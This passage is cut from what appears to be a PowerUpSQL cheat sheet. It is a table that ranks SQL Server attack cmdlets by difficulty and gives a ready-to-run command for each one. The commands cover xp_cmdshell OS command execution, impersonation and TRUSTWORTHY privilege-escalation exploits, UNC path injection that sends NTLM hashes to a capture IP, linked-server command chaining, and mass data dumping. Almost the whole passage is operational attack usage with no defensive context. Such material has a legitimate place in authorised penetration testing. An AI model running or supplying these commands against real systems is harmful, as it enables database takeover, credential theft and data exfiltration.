| Intermediate | Post-Exploitation         | Get-SQLServiceAccount                                   | Lists SQL service accounts (potential lateral movement).                                                             | Get-SQLServiceAccount -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                                 |
| Intermediate | Privilege Escalation      | Invoke-SQLAudit                                         | Runs high-impact vuln audits (without exploit) for priv esc paths.                                                   | Invoke-SQLAudit -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                                       |
| Advanced     | Initial Discovery / Recon | Get-SQLInstanceScanUDPThreaded                          | Threaded UDP scan for SQL instances on a network/range.                                                              | Get-SQLInstanceScanUDPThreaded -ComputerName 192.168.1.0/24 -Verbose                                            |
| Advanced     | Enumeration               | Get-SQLView                                             | Lists database views.                                                                                                | Get-SQLView -Instance "SQLSERVER\SQLEXPRESS" -NoDefaults -Verbose                                               |
| Advanced     | Enumeration               | Get-SQLDatabaseUser                                     | Lists users in databases.                                                                                            | Get-SQLDatabaseUser -Instance "SQLSERVER\SQLEXPRESS" -NoDefaults -Verbose                                       |
| Advanced     | Credentialed Enumeration  | Get-SQLDatabasePriv                                     | Lists database-level privileges.                                                                                     | Get-SQLDatabasePriv -Instance "SQLSERVER\SQLEXPRESS" -Username testuser -Password Pass123! -NoDefaults -Verbose |
| Advanced     | Credentialed Enumeration  | Get-SQLDatabaseRole                                     | Lists database roles.                                                                                                | Get-SQLDatabaseRole -Instance "SQLSERVER\SQLEXPRESS" -NoDefaults -Verbose                                       |
| Advanced     | Exploitation              | Invoke-SQLAuditPrivImpersonateLogin                     | Audits and exploits impersonation for priv esc (with -Exploit).                                                      | Invoke-SQLAuditPrivImpersonateLogin -Instance "SQLSERVER\SQLEXPRESS" -Exploit -Verbose                          |
| Advanced     | Exploitation              | Invoke-SQLAuditPrivXpDirtree                            | Checks/exploits xp\_dirtree for UNC injection or access.                                                             | Invoke-SQLAuditPrivXpDirtree -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                          |
| Advanced     | Post-Exploitation         | Get-SQLServerCredential                                 | Lists server credentials (proxies).                                                                                  | Get-SQLServerCredential -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                               |
| Advanced     | Post-Exploitation         | Get-SQLAgentJob                                         | Lists SQL Agent jobs (for command injection checks).                                                                 | Get-SQLAgentJob -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                                       |
| Advanced     | Privilege Escalation      | Invoke-SQLAuditPrivTrustworthy                          | Audits trustworthy databases for module execution priv esc.                                                          | Invoke-SQLAuditPrivTrustworthy -Instance "SQLSERVER\SQLEXPRESS" -Exploit -Verbose                               |
| Expert       | Enumeration               | Get-SQLDatabaseRoleMember                               | Lists members of database roles.                                                                                     | Get-SQLDatabaseRoleMember -Instance "SQLSERVER\SQLEXPRESS" -NoDefaults -Verbose                                 |
| Expert       | Enumeration               | Get-SQLDatabaseSchema                                   | Lists database schemas.                                                                                              | Get-SQLDatabaseSchema -Instance "SQLSERVER\SQLEXPRESS" -NoDefaults -Verbose                                     |
| Expert       | Credentialed Enumeration  | Get-SQLServerLink                                       | Lists linked servers (for chaining).                                                                                 | Get-SQLServerLink -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                                     |
| Expert       | Exploitation              | Invoke-SQLOSCmd                                         | Enables and executes OS commands via xp\_cmdshell (expert due to risk).                                              | Invoke-SQLOSCmd -Instance "SQLSERVER\SQLEXPRESS" -Command "whoami" -Verbose                                     |
| Expert       | Exploitation              | Invoke-SQLAuditPrivDbChaining                           | Audits/exploits cross-database ownership chaining.                                                                   | Invoke-SQLAuditPrivDbChaining -Instance "SQLSERVER\SQLEXPRESS" -Exploit -Verbose                                |
| Expert       | Post-Exploitation         | Get-SQLStoredProcedureAutoExec                          | Lists auto-executing stored procs (startup).                                                                         | Get-SQLStoredProcedureAutoExec -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                        |
| Expert       | Post-Exploitation         | Get-SQLTriggerDml                                       | Lists DML triggers (for backdoor checks).                                                                            | Get-SQLTriggerDml -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                                     |
| Expert       | Privilege Escalation      | Invoke-SQLEscalatePriv                                  | Attempts sysadmin priv esc via identified vulns.                                                                     | Invoke-SQLEscalatePriv -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                                |
| Insane       | Initial Discovery / Recon | Get-SQLInstanceScanUDP                                  | Non-threaded UDP scan (rare, for precision in large nets).                                                           | Get-SQLInstanceScanUDP -ComputerName SQLSERVER -Verbose                                                         |
| Insane       | Enumeration               | Get-SQLStoredProcedureCLR                               | Lists CLR stored procs (custom .NET code, rare exploits).                                                            | Get-SQLStoredProcedureCLR -Instance "SQLSERVER\SQLEXPRESS" -Verbose                                             |
| Insane       | Credentialed Enumeration  | Get-SQLDomainObject                                     | Executes arbitrary LDAP queries on domain via SQL (AD enum).                                                         | Get-SQLDomainObject -Instance "SQLSERVER\SQLEXPRESS" -Username domain\user -Password Pass123! -Verbose          |
| Insane       | Exploitation              | Invoke-SQLUncPathInjection                              | Injects UNC paths to capture NTLM hashes via Inveigh (insane for relay risks).                                       | Invoke-SQLUncPathInjection -Instance "SQLSERVER\SQLEXPRESS" -CaptureIp 192.168.1.100 -Verbose                   |
| Insane       | Exploitation              | Invoke-SQLAuditSQLiSpExecuteAs                          | Audits/exploits SQLi in procs via execute as.                                                                        | Invoke-SQLAuditSQLiSpExecuteAs -Instance "SQLSERVER\SQLEXPRESS" -Exploit -Verbose                               |
| Insane       | Post-Exploitation         | Get-SQLServerLinkCrawl                                  | Crawls linked servers and executes queries/commands (chain attacks).                                                 | Get-SQLServerLinkCrawl -Instance "SQLSERVER\SQLEXPRESS" -Query "SELECT @@VERSION" -Verbose                      |
| Insane       | Post-Exploitation         | Invoke-SQLDumpInfo                                      | Dumps all server/db info to files (mass exfil).                                                                      | Invoke-SQLDumpInfo -Instance "SQLSERVER\SQLEXPRESS" -OutFolder c:\temp -Verbose                                 |
| Insane       | Privilege Escalation      | Get-SQLDomainUser -UserState TrustedToAuthForDelegation | Lists delegation-enabled users via SQL-AD queries (kerberoast gold).                                                 | Get-SQLDomainUser -Instance "SQLSERVER\SQLEXPRESS" -UserState TrustedToAuthForDelegation -Verbose               |
